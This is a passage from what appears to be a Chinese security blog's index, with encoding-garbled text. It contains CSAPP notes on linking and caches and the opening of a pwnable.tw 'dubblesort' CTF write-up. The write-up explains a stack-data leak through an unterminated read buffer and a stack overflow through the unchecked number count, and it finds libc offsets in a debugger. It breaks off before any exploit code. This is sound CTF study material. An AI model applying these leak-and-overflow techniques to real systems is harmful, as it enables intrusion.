r.offset = 0x4004d0 + 0xf = 0x4004df ç„¶åæˆ‘ä»¬éœ€è¦è®¡ç®—å ä½ç¬¦çš„å†…å®¹ï¼Œæ ¹æ®ç›¸å¯¹åœ°å€çš„è®¡ç®—æ–¹æ³•ï¼Œå¯ä»¥çŸ¥é“å ä½ç¬¦çš„å†…å®¹æ˜¯ç›®æ ‡åœ°å€å‡å»å½“å‰PCçš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚å¯ä»¥é€šè¿‡ADDR(r.symbol)æ¥è·å¾—ç›®æ ‡åœ°å€ï¼Œå³sumå‡½æ•°çš„åœ°å€ï¼Œå¯ä»¥é€šè¿‡refaddrå‡å»4å­—èŠ‚æ¥è·å¾—ä¸‹ä¸€æŒ‡ä»¤çš„åœ°å€ï¼Œç„¶åå¯ä»¥é€šè¿‡ä»¥ä¸‹è®¡ç®—å…¬å¼æ¥è®¡ç®—å ä½ç¬¦å†…å®¹ refptr = s + r.offset //å ä½ç¬¦çš„æŒ‡é’ˆ ADDR(r.symbol) = ADDR(sum) = 0x4004e8 *refptr = (unsigned)(ADDR(s.symbol) + r.addend - refaddr) = (unsigned)(0x4004e8 + (-4) - 0x4004df) = (unsigned) 0x5 R_X86_64_32 è¯¥é‡å®šä½æ¡ç›®ä¸»è¦ç”¨æ¥äº§ç”Ÿ32ä½ç»å¯¹åœ°å€çš„å¼•ç”¨ï¼Œå³æ•°ç»„çš„é‡å®šä½ã€‚ ä½¿ç”¨æ•°ç»„arrayçš„æŒ‡ä»¤å¤„äº.textèŠ‚åç§»0x9å¤„ï¼Œåé¢æœ‰ä¸€ä¸ªå­—èŠ‚çš„æ“ä½œç ï¼Œåé¢è·Ÿç€çš„å°±æ˜¯æ•°ç»„arrayçš„32ä½ç»å¯¹åœ°å€çš„å¼•ç”¨çš„å ä½ç¬¦ï¼Œæ‰€ä»¥é“¾æ¥å™¨ä¿®æ”¹çš„ä½ç½®åœ¨å½“å‰èŠ‚åç§»0xaå¤„ã€‚è¯¥é‡å®šä½æ¡ç›®råŒ…å«ä»¥ä¸‹å­—æ®µ r.offset = 0xa r.symbol = array r.type = R_X86_64_32 r.added = 0 æˆ‘ä»¬å¯ä»¥é€šè¿‡r.symbolçš„åœ°å€æ¥ç¡®å®šæ•°ç»„arrayçš„å†…å­˜åœ°å€ï¼Œç„¶åç›´æ¥å°†è¯¥å†…å­˜åœ°å€ä¿å­˜åˆ°å ä½ç¬¦ä¸­ï¼Œå³ refptr = s + r.offset //å ä½ç¬¦çš„æŒ‡é’ˆ *refptr = (unsigned)(ADDR(r.symbol) + r.addend) = (unsigned) 0x601018 ","date":"2021-02-14","objectID":"/csapp-lecture-08/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 08","uri":"/csapp-lecture-08/#é‡å®šä½"},{"categories":["Pwning"],"content":"åº“æ‰“æ¡©Linuxé“¾æ¥å™¨æ”¯æŒ**åº“æ‰“æ¡©ï¼ˆLibrary Interpositioningï¼‰**æŠ€æœ¯ï¼Œå…è®¸ä½ æˆªè·å¯¹å…±äº«åº“å‡½æ•°çš„è°ƒç”¨ï¼Œæ›¿æ¢æˆè‡ªå·±çš„ä»£ç ã€‚åŸºæœ¬æ€æƒ³ä¸ºï¼šåˆ›å»ºä¸€ä¸ªä¸å…±äº«åº“å‡½æ•°ç›¸åŒå‡½æ•°åŸå‹çš„åŒ…è£…å‡½æ•°ï¼Œä½¿å¾—ç³»ç»Ÿè°ƒç”¨åŒ…è£…å‡½æ•°ï¼Œè€Œä¸æ˜¯è°ƒç”¨ç›®æ ‡å‡½æ•°ã€‚ ","date":"2021-02-14","objectID":"/csapp-lecture-08/:4:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 08","uri":"/csapp-lecture-08/#åº“æ‰“æ¡©"},{"categories":["Pwning"],"content":"Lecture 07: Cache Memories","date":"2021-02-13","objectID":"/csapp-lecture-07/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#lecture-07-cache-memories"},{"categories":["Pwning"],"content":"é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨"},{"categories":["Pwning"],"content":"é€šç”¨çš„é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ç»„ç»‡ç»“æ„è¾ƒæ—©æœŸçš„è®¡ç®—æœºç³»ç»Ÿçš„å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„åªæœ‰ä¸‰å±‚ï¼šCPUå¯„å­˜å™¨ã€ä¸»å­˜å’Œç£ç›˜ï¼Œä½†æ˜¯éšç€CPUçš„å‘å±•ï¼Œä½¿å¾—ä¸»å­˜å’ŒCPUä¹‹é—´çš„è¯»å–é€Ÿåº¦é€æ¸æ‹‰å¤§ï¼Œç”±æ­¤åœ¨CPUå’Œä¸»å­˜ä¹‹é—´æ’å…¥ä¸€ä¸ªå°è€Œå¿«é€Ÿçš„SRAMé«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ï¼Œç§°ä¸ºL1é«˜é€Ÿç¼“å­˜ï¼Œéšç€åç»­çš„å‘å±•ï¼Œåˆå¢åŠ äº†L2é«˜é€Ÿç¼“å­˜å’ŒL3é«˜é€Ÿç¼“å­˜ã€‚ è€ƒè™‘ä¸€ä¸ªè®¡ç®—æœºç³»ç»Ÿï¼Œå…¶ä¸­æ¯ä¸ªå­˜å‚¨å™¨åœ°å€æœ‰ m ä½ï¼Œå½¢æˆ M=2mM=2m ä¸ªä¸åŒçš„åœ°å€ã€‚è¿™æ ·ä¸€ä¸ªæœºå™¨çš„é«˜é€Ÿç¼“å­˜è¢«ç»„ç»‡æˆä¸€ä¸ªæœ‰ S=2sS=2s ä¸ªé«˜é€Ÿç¼“å­˜ç»„ï¼ˆcache setï¼‰çš„æ•°ç»„ã€‚æ¯ä¸ªç»„åŒ…å« E ä¸ªé«˜é€Ÿç¼“å­˜è¡Œï¼ˆcache lineï¼‰ã€‚æ¯ä¸ªè¡Œæ˜¯ç”±ä¸€ä¸ª B=2bB=2b å­—èŠ‚çš„æ•°æ®å—ï¼ˆblockï¼‰ç»„æˆçš„ï¼Œä¸€ä¸ªæœ‰æ•ˆä½ï¼ˆvalid bitï¼‰æŒ‡æ˜è¿™ä¸ªè¡Œæ˜¯å¦åŒ…å«æœ‰æ„ä¹‰çš„ä¿¡æ¯ï¼ˆä¸ºäº†æ–¹ä¾¿ï¼‰ï¼Œè¿˜æœ‰ t = m-(b+s) ä¸ªæ ‡è®°ä½ï¼ˆtag bitï¼‰ï¼ˆæ˜¯å½“å‰å—çš„å†…å­˜åœ°å€çš„ä½çš„ä¸€ä¸ªå­é›†ï¼‰ï¼Œå®ƒä»¬å”¯ä¸€åœ°æ ‡è¯†å­˜å‚¨åœ¨è¿™ä¸ªé«˜é€Ÿç¼“å­˜è¡Œä¸­çš„å—ã€‚è¯¥é«˜é€Ÿç¼“å­˜çš„ç»“æ„å¯ä»¥é€šè¿‡å…ƒç»„(S, E, B, m)æ¥æè¿°ï¼Œä¸”å®¹é‡Cä¸ºæ‰€æœ‰å—çš„å¤§å°ä¹‹å’Œï¼Œ$C=SEB$ã€‚ å‚æ•° S å’Œ B å°† m ä¸ªåœ°å€ä½åˆ†ä¸ºäº†ä¸‰ä¸ªå­—æ®µã€‚ åœ°å€ A ä¸­æœ‰ s ä¸ªç»„ç´¢å¼•ä½æ˜¯ä¸€ä¸ªåˆ° S ä¸ªç»„çš„æ•°ç»„çš„ç´¢å¼•ï¼Œæ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°ã€‚ åœ°å€ A ä¸­çš„ t ä¸ªæ ‡è®°ä½å‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªç»„ä¸­çš„å“ªä¸€è¡ŒåŒ…å«è¿™ä¸ªå­—ã€‚å½“ä¸”ä»…å½“è®¾ç½®äº†æœ‰æ•ˆä½å¹¶ä¸”è¯¥è¡Œçš„æ ‡è®°ä½ä¸åœ°å€ A ä¸­çš„æ ‡è®°ä½ç›¸åŒ¹é…æ—¶ï¼Œç»„ä¸­çš„è¿™ä¸€è¡Œæ‰åŒ…å«è¿™ä¸ªå­—ã€‚(Valid bits are also used in the context of multiprocessors) ä¸€æ—¦æˆ‘ä»¬åœ¨ç”±ç»„ç´¢å¼•æ ‡è¯†çš„ç»„ä¸­å®šä½äº†ç”±æ ‡å·æ‰€æ ‡è¯†çš„è¡Œï¼Œé‚£ä¹ˆ b ä¸ªå—åç§»ä½ç»™å‡ºäº† B ä¸ªå­—èŠ‚çš„æ•°æ®å—ä¸­çš„å­—åç§»ã€‚ ","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#é€šç”¨çš„é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ç»„ç»‡ç»“æ„"},{"categories":["Pwning"],"content":"ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜ï¼ˆsingle block/line per setï¼‰å½“E=1 æ—¶ï¼Œé«˜é€Ÿç¼“å­˜ç§°ä¸ºç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜ï¼ˆDirect-mapped Cacheï¼‰ï¼Œæ¯ä¸ªé«˜é€Ÿç¼“å­˜ç»„ä¸­åªå«æœ‰ä¸€ä¸ªé«˜é€Ÿç¼“å­˜è¡Œã€‚ ç»„é€‰æ‹© è¡ŒåŒ¹é… å­—æŠ½å– å¦‚æœæ‰¾åˆ°äº†å¯¹åº”çš„é«˜é€Ÿç¼“å­˜è¡Œï¼Œåˆ™å¯ä»¥å°†bä½è¡¨ç¤ºä¸ºæ— ç¬¦å·æ•°ä½œä¸ºå—åç§»é‡ï¼Œå¾—åˆ°å¯¹åº”ä½ç½®çš„å­—ã€‚æœ€åï¼Œå¦‚æœä¸å‘½ä¸­åˆ™è¿›è¡Œè¡Œæ›¿æ¢ï¼Œéœ€è¦é©±é€å‡ºä¸€ä¸ªç°å­˜çš„è¡Œã€‚ x ä¸ y å—ä¹‹é—´çš„æŠ–åŠ¨ï¼ˆthrashï¼‰ï¼Œå³é«˜é€Ÿç¼“å­˜åå¤åœ°åŠ è½½å’Œé©±é€ç›¸åŒçš„é«˜é€Ÿç¼“å­˜å—çš„ç»„ã€‚ ","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:2","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜single-blockline-per-set"},{"categories":["Pwning"],"content":"ç»„ç›¸è”é«˜é€Ÿç¼“å­˜ï¼ˆE-way Set-Associative Cache or E blocks/lines per setï¼‰ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜çš„å†²çªä¸å‘½ä¸­æ˜¯ç”±äºæ¯ä¸ªé«˜é€Ÿç¼“å­˜ç»„ä¸­åªæœ‰ä¸€ä¸ªé«˜é€Ÿç¼“å­˜è¡Œï¼Œæ‰€ä»¥æ‰©å¤§Eçš„å€¼ï¼Œå½“$1\u003cE\u003cC/B$ æ—¶ï¼Œç§°ä¸ºEè·¯ç»„ç›¸è”é«˜é€Ÿç¼“å­˜ï¼ˆSet Associative Cacheï¼‰ï¼Œæ­¤æ—¶éœ€è¦é¢å¤–çš„ç¡¬ä»¶é€»è¾‘æ¥è¿›è¡Œè¡ŒåŒ¹é…ï¼Œæ‰€ä»¥æ›´åŠ æ˜‚è´µã€‚ï¼ˆ$E\u003cC/B$å³è¦æ±‚$S\u003e1$) å½“ç¼“å­˜ä¸å‘½ä¸­æ—¶éœ€è¦è¿›è¡Œç¼“å­˜è¡Œæ›¿æ¢ï¼Œå¦‚æœå¯¹åº”çš„é«˜é€Ÿç¼“å­˜ç»„ä¸­æœ‰ç©ºçš„é«˜é€Ÿç¼“å­˜è¡Œï¼Œåˆ™ç›´æ¥å°†å…¶ä¿å­˜åˆ°ç©ºè¡Œä¸­ã€‚ä½†æ˜¯å¦‚æœæ²¡æœ‰ç©ºè¡Œï¼Œå°±è¦è€ƒè™‘åˆé€‚çš„æ›¿æ¢ç­–ç•¥ï¼š æœ€ç®€å•çš„æ›¿æ¢ç­–ç•¥æ˜¯éšæœºé€‰æ‹©è¦æ›¿æ¢çš„è¡Œ **æœ€ä¸å¸¸ä½¿ç”¨ï¼ˆLeast-Frequently-Usedï¼ŒLFUï¼‰ç­–ç•¥ï¼š**æ›¿æ¢è¿‡å»æŸä¸ªæ—¶é—´çª—å£å†…å¼•ç”¨æ¬¡æ•°æœ€å°‘çš„ä¸€è¡Œã€‚ **æœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼ˆLeast-Recently-Usedï¼ŒLRUï¼‰ç­–ç•¥ï¼š**æ›¿æ¢æœ€åä¸€æ¬¡è®¿é—®æ—¶é—´æœ€ä¹…è¿œçš„é‚£ä¸€è¡Œ ","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:3","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#ç»„ç›¸è”é«˜é€Ÿç¼“å­˜e-way-set-associative-cache-or-e-blockslines-per-set"},{"categories":["Pwning"],"content":"å…¨ç›¸è”é«˜é€Ÿç¼“å­˜**å…¨ç›¸è”é«˜é€Ÿç¼“å­˜ï¼ˆFull Associative Cacheï¼‰**æ˜¯ç”¨ä¸€ä¸ªåŒ…å«æ‰€æœ‰é«˜é€Ÿç¼“å­˜è¡Œçš„ç»„ç»„æˆçš„ï¼Œå…¶ä¸­$E=C/B$ ï¼Œå³$S=1$ ã€‚ ç”±äºå…¨ç›¸è”é«˜é€Ÿç¼“å­˜åªæœ‰ä¸€ä¸ªç»„ï¼Œæ‰€ä»¥ä¸åŒ…å«ç»„ç´¢å¼•ç¼–ç  ","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:4","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#å…¨ç›¸è”é«˜é€Ÿç¼“å­˜"},{"categories":["Pwning"],"content":"å†™æ“ä½œå½“CPUæƒ³è¦å¯¹åœ°å€Aè¿›è¡Œå†™æ“ä½œæ—¶ï¼Œä¼šé€šè¿‡åœ°å€Aåˆ¤æ–­æ˜¯å¦ç¼“å­˜äº†è¯¥åœ°å€ï¼Œå¦‚æœç¼“å­˜äº†ç§°ä¸ºå†™å‘½ä¸­ï¼ˆWrite Hitï¼‰ï¼Œå¦åˆ™ç§°ä¸ºå†™ä¸å‘½ä¸­ï¼ˆWrite Missï¼‰ã€‚ **å†™å‘½ä¸­ï¼š**é«˜é€Ÿç¼“å­˜ä¼šå…ˆæ›´æ–°ç¼“å­˜çš„å‰¯æœ¬ï¼Œç„¶åå¯ä»¥é‡‡å–ä¸åŒæ–¹æ³•æ›´æ–°ä¸‹ä¸€å±‚çš„å‰¯æœ¬ **ç›´å†™ï¼ˆWrite-Thoughï¼‰ï¼š**ç«‹å³æ›´æ–°ä¸‹ä¸€å±‚çš„å‰¯æœ¬å€¼ã€‚ç¼ºç‚¹æ˜¯æ¯æ¬¡å†™éƒ½ä¼šå¼•èµ·æ€»çº¿æµé‡ã€‚ å†™å›ï¼ˆWrite-Backï¼‰ï¼šä¸ºæ¯ä¸ªé«˜é€Ÿç¼“å­˜è¡Œç»´æŠ¤ä¸€ä¸ªä¿®æ”¹ä½ï¼ˆDirty Bitï¼‰ï¼Œè¡¨æ˜è¿™ä¸ªé«˜é€Ÿç¼“å­˜å—æ˜¯å¦è¢«ä¿®æ”¹ã€‚å½“è¢«ä¿®æ”¹çš„é«˜é€Ÿç¼“å­˜å—è¢«é©±é€æ—¶ï¼Œä¼šæŸ¥çœ‹ä¿®æ”¹ä½ï¼Œåˆ¤æ–­è¯¥å—æ˜¯å¦è¢«ä¿®æ”¹ï¼Œåªæœ‰è¢«ä¿®æ”¹æ‰ä¼šæ›´æ–°ä¸‹ä¸€å±‚çš„å‰¯æœ¬å€¼ã€‚èƒ½å¤Ÿæ˜¾è‘—å‡å°‘æ€»çº¿æµé‡ï¼Œä½†æ˜¯å¤æ‚æ€§é«˜ã€‚ å†™ä¸å‘½ä¸­ï¼š **å†™ä¸åˆ†é…ï¼ˆNot-Write-Allocateï¼‰ï¼š**ç›´æ¥å°†å­—å†™åˆ°ä¸‹ä¸€å±‚ä¸­ã€‚ **å†™åˆ†é…ï¼ˆWrite-Allocateï¼‰ï¼š**åŠ è½½ç›¸åº”çš„ä¸‹ä¸€å±‚çš„å—åˆ°å½“å‰å±‚çš„é«˜é€Ÿç¼“å­˜ä¸­ï¼Œç„¶åæ›´æ–°å½“å‰é«˜é€Ÿç¼“å­˜å—ã€‚å¾—ç›Šäºç©ºé—´å±€éƒ¨æ€§ï¼Œè¿›è¡Œä¸€æ¬¡å†™åˆ†é…åï¼Œä¸‹ä¸€æ¬¡æœ‰è¾ƒé«˜å‡ ç‡ä¼šå†™å‘½ä¸­ï¼Œä½†æ˜¯ç¼ºç‚¹æ˜¯æ¯æ¬¡å†™ä¸å‘½ä¸­å°±è¦å°†å—ä»ç¬¬ä¸€å±‚å‘ä¸Šä¼ è¾“ã€‚ ","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:5","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#å†™æ“ä½œ"},{"categories":["Pwning"],"content":"çœŸå®é«˜é€Ÿç¼“å­˜ç»“æ„å¯ä»¥å°†é«˜é€Ÿç¼“å­˜åˆ†æˆä»¥ä¸‹å‡ ç§ï¼š **i-cacheï¼š**åªä¿å­˜æŒ‡ä»¤çš„é«˜é€Ÿç¼“å­˜ **d-cacheï¼š**åªä¿å­˜ç¨‹åºæ•°æ®çš„é«˜é€Ÿç¼“å­˜ **Unified Cacheï¼š**å³èƒ½ä¿å­˜æŒ‡ä»¤ï¼Œä¹Ÿèƒ½ä¿å­˜ç¨‹åºæ•°æ®çš„é«˜é€Ÿç¼“å­˜ ","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:6","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#çœŸå®é«˜é€Ÿç¼“å­˜ç»“æ„"},{"categories":["Pwning"],"content":"å‚æ•°å¯¹æ€§èƒ½çš„å½±å“è¡¡é‡é«˜é€Ÿç¼“å­˜çš„æŒ‡æ ‡æœ‰ï¼š **å‘½ä¸­ç‡ï¼ˆHit Rateï¼‰ï¼š**å†…å­˜å¼•ç”¨å‘½ä¸­çš„æ¯”ç‡ï¼Œå‘½ä¸­æ•°é‡/å¼•ç”¨æ•°é‡ã€‚ **ä¸å‘½ä¸­ç‡ï¼ˆMiss Rateï¼‰ï¼š**å†…å­˜å¼•ç”¨ä¸å‘½ä¸­çš„æ¯”ç‡ï¼Œä¸å‘½ä¸­æ•°é‡/å¼•ç”¨æ•°é‡ã€‚é€šå¸¸ï¼ŒL1é«˜é€Ÿç¼“å­˜ä¸º3~10%ï¼ŒL2é«˜é€Ÿç¼“å­˜ä¸º\u003c1%ã€‚ å‘½ä¸­æ—¶é—´ï¼ˆHit Timeï¼‰ï¼š ä»é«˜é€Ÿç¼“å­˜ä¼ è¾“ä¸€ä¸ªå­—åˆ°CPUçš„æ—¶é—´ï¼ŒåŒ…æ‹¬ç»„é€‰æ‹©ã€è¡ŒåŒ¹é…å’Œå­—é€‰æ‹©æ—¶é—´ã€‚é€šå¸¸ï¼ŒL1é«˜é€Ÿç¼“å­˜éœ€è¦4ä¸ªæ—¶é’Ÿå‘¨æœŸï¼ŒL2é«˜é€Ÿç¼“å­˜éœ€è¦10ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚ **ä¸å‘½ä¸­å¤„ç½šï¼ˆMiss Penaltyï¼‰ï¼š**å½“ç¼“å­˜ä¸å‘½ä¸­æ—¶ï¼Œè¦ä»ä¸‹ä¸€å±‚çš„å­˜å‚¨ç»“æ„ä¸­ä¼ è¾“å¯¹åº”å—åˆ°å½“å‰å±‚ä¸­ï¼Œéœ€è¦é¢å¤–çš„æ—¶é—´ï¼ˆä¸åŒ…å«å‘½ä¸­æ—¶é—´ï¼‰ã€‚é€šå¸¸ï¼Œä¸»å­˜éœ€è¦50~200ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚ æƒ³è¦ç¼–å†™é«˜é€Ÿç¼“å­˜å‹å¥½ï¼ˆCache Friendlyï¼‰çš„ä»£ç ï¼ŒåŸºæœ¬æ–¹æ³•ä¸ºï¼š è®©æœ€å¸¸è§çš„æƒ…å†µè¿è¡Œå¾—å¿«ï¼Œå°†æ³¨æ„åŠ›é›†ä¸­åœ¨æ ¸å¿ƒå‡½æ•°çš„å¾ªç¯ä¸­ å°½å¯èƒ½å‡å°‘æ¯ä¸ªå¾ªç¯å†…éƒ¨çš„ç¼“å­˜ä¸å‘½ä¸­ï¼Œå¯ä»¥å¯¹å±€éƒ¨å˜é‡åå¤å¼•ç”¨ï¼Œå› ä¸ºç¼–è¯‘å™¨ä¼šå°†å…¶ä¿å­˜åˆ°å¯„å­˜å™¨ä¸­ï¼Œå…¶ä»–çš„å˜é‡æœ€å¥½ä½¿ç”¨æ­¥é•¿ä¸º1çš„å¼•ç”¨æ¨¡å¼ã€‚ ä¹‹åå°±æ˜¯å¤§æ®µçš„æ•°æ®åˆ†æä¸åŒçš„å‚æ•°å¯¹æ€§èƒ½çš„å½±å“ï¼Œè¿™é‡Œæœ€é‡è¦çš„ä¸€ç‚¹æ˜¯å‘½ä¸­ç‡ï¼Œå‘½ä¸­å’Œä¸å‘½ä¸­ä¸¤è€…å¯¹æ€§èƒ½å½±å“å¾ˆå¤§ï¼Œæ¯”å¦‚99%å‘½ä¸­ç‡çš„æ€§èƒ½ä¼šæ¯”97%å‘½ä¸­ç‡é«˜ä¸¤å€ã€‚ ","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:7","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#å‚æ•°å¯¹æ€§èƒ½çš„å½±å“"},{"categories":["Pwning"],"content":"æ”¹å–„ç¨‹åºé‡æ–°æ’åˆ—å¾ªç¯æ¥æ”¹å–„ç©ºé—´å±€éƒ¨æ€§ å¯¹å¾ªç¯é‡æ’åˆ—ï¼Œæ¥æé«˜ç©ºé—´å±€éƒ¨æ€§ï¼Œå¢åŠ å‘½ä¸­ç‡ã€‚ ä½¿ç”¨åˆ†å—æ¥æé«˜æ—¶é—´å±€éƒ¨æ€§ åˆ†å—çš„ä¸»è¦æ€æƒ³æ˜¯å°†ä¸€ä¸ªç¨‹åºä¸­çš„æ•°æ®ç»“æ„ç»„ç»‡æˆå¤§çš„ç‰‡ï¼ˆChunkï¼‰ï¼Œä½¿å¾—èƒ½å¤Ÿå°†ä¸€ä¸ªç‰‡åŠ è½½åˆ°L1é«˜é€Ÿç¼“å­˜ä¸­ï¼Œå¹¶åœ¨è¿™ä¸ªåé‡è¿›è¡Œè¯»å†™ã€‚åˆ†å—é™ä½ä¸å‘½ä¸­ç‡æ˜¯å› ä¸ºåŠ è½½ä¸€ä¸ªå—åï¼Œå°±åå¤ä½¿ç”¨è¯¥å—ï¼Œæé«˜äº†ç©ºé—´å±€éƒ¨æ€§ã€‚ ","date":"2021-02-13","objectID":"/csapp-lecture-07/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#æ”¹å–„ç¨‹åº"},{"categories":["Writeups"],"content":" Challenges Tricks pwnable.tw-dubblesort canary æ–°å¹´å¿«ä¹ï¼æ²¡æƒ³åˆ°å§ï¼æ˜¥èŠ‚æˆ‘ä¹Ÿä¸æ¶ˆåœâ€¦ä¸è¿‡åšé¢˜çš„é€Ÿåº¦è¦å˜æ…¢äº†ï¼ŒSakuraå¸ˆå‚…è¿˜è¦äº¤è¿™å‘¨çš„ä½œä¸šï¼Œä¸‹å‘¨æ”¾ä¸€ä¸ªå‡ï¼Œæ‰“ç®—æŠŠhow2heapå­¦å®Œï¼Œåšç‚¹ä¾‹é¢˜ã€‚ ","date":"2021-02-12","objectID":"/challenges-100-week-6/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 6","uri":"/challenges-100-week-6/#"},{"categories":["Writeups"],"content":"dubblesortè¿™ä¸ªå‡ºé¢˜äººçš„è‹±æ–‡æ˜¯ä¸æ˜¯ä¸å¤ªå¥½ï¼Ÿ ","date":"2021-02-12","objectID":"/challenges-100-week-6/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 6","uri":"/challenges-100-week-6/#dubblesort"},{"categories":["Writeups"],"content":"checksec [*] '/home/niebelungen/Desktop/pwnable.tw/dubblesort/dubblesort' Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled æ‰€æœ‰ä¿æŠ¤å…¨å¼€ã€‚ ","date":"2021-02-12","objectID":"/challenges-100-week-6/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 6","uri":"/challenges-100-week-6/#checksec"},{"categories":["Writeups"],"content":"ida int __cdecl main(int argc, const char **argv, const char **envp) { int count; // eax unsigned int *v4; // edi unsigned int i; // esi unsigned int j; // esi int result; // eax unsigned int _count; // [esp+18h] [ebp-74h] BYREF unsigned int num[8]; // [esp+1Ch] [ebp-70h] BYREF char buf[64]; // [esp+3Ch] [ebp-50h] BYREF unsigned int v11; // [esp+7Ch] [ebp-10h] v11 = __readgsdword(0x14u); init(); __printf_chk(1, (int)\"What your name :\"); read(0, buf, 0x40u); __printf_chk(1, (int)\"Hello %s,How many numbers do you what to sort :\"); __isoc99_scanf(\"%u\", \u0026_count); count = _count; if ( _count ) { v4 = num; for ( i = 0; i \u003c _count; ++i ) { __printf_chk(1, (int)\"Enter the %d number : \"); fflush(stdout); __isoc99_scanf(\"%u\", v4); count = _count; ++v4; } } bubblesort(num, count); puts(\"Result :\"); if ( _count ) { for ( j = 0; j \u003c _count; ++j ) __printf_chk(1, (int)\"%u \"); } result = 0; if ( __readgsdword(0x14u) != v11 ) check_canary(); return result; ç¨‹åºçœ‹ä¸Šå»æ˜¯æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œæ¼æ´åœ¨ç¨‹åºå‡½æ•°çš„å®ç°ä¸Šã€‚ ä½¿ç”¨readå‡½æ•°è¯»å–çš„bufæ˜¯ç”¨\\x0aè¿›è¡Œæˆªæ–­çš„ã€‚è€Œprintfåœ¨è¾“å‡ºå­—ç¬¦ä¸²çš„æ—¶å€™æ˜¯ç”¨\\x00è¿›è¡Œæˆªæ–­ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥æ³„éœ²æ ˆä¸Šçš„å†…å®¹ã€‚è€Œé€šè¿‡è¾“å…¥æ•°å­—çš„æ•°é‡æˆ‘ä»¬å¯ä»¥å®ç°æ ˆæº¢å‡ºã€‚ åœ¨æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²çš„é™„è¿‘ï¼š 0f:003câ”‚ ecx esi 0xffffcdac â—‚â€” 'aaaabbbb\\n' 10:0040â”‚ 0xffffcdb0 â—‚â€” 'bbbb\\n' 11:0044â”‚ 0xffffcdb4 â—‚â€” 0xa /* '\\n' */ 12:0048â”‚ 0xffffcdb8 â€”â–¸ 0x56555034 â—‚â€” push es 13:004câ”‚ 0xffffcdbc â—‚â€” 0x16 14:0050â”‚ 0xffffcdc0 â—‚â€” 0x8000 15:0054â”‚ 0xffffcdc4 â€”â–¸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0 æœ‰ä¸€ä¸ª(_GLOBAL_OFFSET_TABLE_)ï¼Œæ˜æ˜¾å®ƒçš„åœ°å€çš„libcä¸­çš„ï¼ŒæŸ¥çœ‹å®ƒåœ¨libcä¸­çš„åç§»ã€‚ pwndbg\u003e vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x56555000 0x56556000 r-xp 1000 0 /home/niebelungen/Desktop/pwnable.tw/dubblesort/dubblesort 0x56556000 0x56557000 r--p 1000 0 /home/niebelungen/Desktop/pwnable.tw/dubblesort/dubblesort 0x56557000 0x56558000 rw-p 1000 1000 /home/niebelungen/Desktop/pwnable.tw/dubblesort/dubblesort 0xf7e01000 0xf7e02000 rw-p 1000 0 0xf7e02000 0xf7fb2000 r-xp 1b0000 0 /lib/i386-linux-gnu/libc-2.23.so 0xf7fb2000 0xf7fb3000 ---p 1000 1b0000 /lib/i386-linux-gnu/libc-2.23.so 0xf7fb3000 0xf7fb5000 r--p 2000 1b0000 /lib/i386-linux-gnu/libc-2.23.so 0xf7fb5000 0xf7fb6000 rw-p 1000 1b2000 /lib/i386-linux-gnu/libc-2.23.so 0xf7fb5000-0xf7e02000=0x1b3000ï¼Œè¿™é‡Œæˆ‘ä»¬åŠ è½½çš„æ˜¯æœ¬åœ°libcæ‰€ä»¥æŸ¥çœ‹libcçš„èŠ‚ä¿¡æ¯ã€‚ [32] .got.plt PROGBITS 001b3000 1b2000 000030 04 WA 0 0 4 å…¶ä¸º.got.pltèŠ‚ï¼Œå†æŸ¥çœ‹æœåŠ¡å™¨ä¸Šlibcçš„åç§» [31] .got.plt PROGBITS 001b0000 1af000 000030 04 WA 0 0 4 .got This is the GOT, or Global Offset Table. This is the actual table of offsets as filled in by the linker for external symbols. .plt This is the PLT, or Procedure Linkage Table. These are stubs that look up the addresses in the .got.plt section, and either jump to the right address, or trigger the code in the linker to look up the address. (If 